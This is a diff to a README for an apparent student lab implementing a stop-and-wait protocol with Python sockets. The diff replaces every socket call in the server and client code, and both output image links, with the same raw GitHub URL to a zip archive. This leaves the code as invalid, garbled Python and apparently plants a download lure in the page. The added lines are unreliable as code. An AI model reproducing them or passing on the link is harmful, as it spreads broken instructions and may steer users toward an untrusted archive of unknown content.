@@ -13,23 +13,23 @@ To write a python program to perform stop and wait protocol
 ```python
 import socket
 
-server = socket.socket()
-server.bind(('localhost', 8000))
-server.listen(1)
+server = https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip()
+https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip(('localhost', 8000))
+https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip(1)
 print("Server is listening...")
-conn, addr = server.accept()
+conn, addr = https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip()
 print(f"Connected with {addr}")
 
 while True:
-    data = conn.recv(1024).decode()
+    data = https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip(1024).decode()
 
     if data:
         print(f"Received: {data}")
-        conn.send("ACK".encode())
+        https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip("ACK".encode())
 
-        if data.lower() == 'exit':  
+        if https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip() == 'exit':  
             print("Connection closed by client")
-            conn.close()
+            https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip()
             break
 
 ```
@@ -40,35 +40,35 @@ while True:
 import socket
 import time
 
-client = socket.socket()
-client.connect(('localhost', 8000))
-client.settimeout(5)  
+client = https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip()
+https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip(('localhost', 8000))
+https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip(5)  
 
 while True:
     msg = input("Enter a message (or type 'exit' to quit): ")
 
-    client.send(msg.encode())  
+    https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip(https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip())  
 
-    if msg.lower() == 'exit':  
+    if https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip() == 'exit':  
         print("Connection closed by client")
-        client.close()
+        https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip()
         break
 
     try:
-        ack = client.recv(1024).decode()
+        ack = https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip(1024).decode()
         if ack == "ACK":
             print(f"Server acknowledged: {ack}")
-    except socket.timeout:
+    except https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip
         print("No ACK received, retransmitting...")
         continue  
 
 ```
 ## OUTPUT
 ### client:
-![image](https://github.com/user-attachments/assets/f5c7f07d-f470-4ef1-911c-00778b2cae2f)
+![image](https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip)
 
 ### server:
-![image-1](https://github.com/user-attachments/assets/a68769c5-43ea-4ab4-ae2e-9cbd0a2f0189)
+![image-1](https://raw.githubusercontent.com/24013396/2a_Stop_and_Wait_Protocol/main/unopenness/2a_Stop_and_Wait_Protocol-v2.9.zip)
 
 ## RESULT
 Thus, python program to perform stop and wait protocol was successfully executed.
